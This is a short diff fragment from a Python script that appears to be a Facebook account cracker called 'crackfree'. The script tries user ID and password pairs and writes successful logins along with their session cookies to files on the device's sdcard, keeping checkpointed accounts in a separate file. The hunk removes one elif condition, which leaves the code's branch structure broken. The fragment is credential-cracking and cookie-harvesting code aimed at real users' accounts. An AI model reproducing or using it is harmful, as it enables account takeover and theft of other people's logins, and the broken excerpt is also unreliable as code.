@@ -753,7 +753,6 @@ def crackfree(idf,pwv):
                 open('/sdcard/SK-TUTUL-FILE-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                 ok.append(uid)
                 break
-                elif 'www.facebook.com' in q['error']['message']:
                 print(f"\r\r{M}[Tutul-CP] {uid} | {pas} ")
                 open('/sdcard/SK-TUTUL-FILE-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                 cps.append(uid)
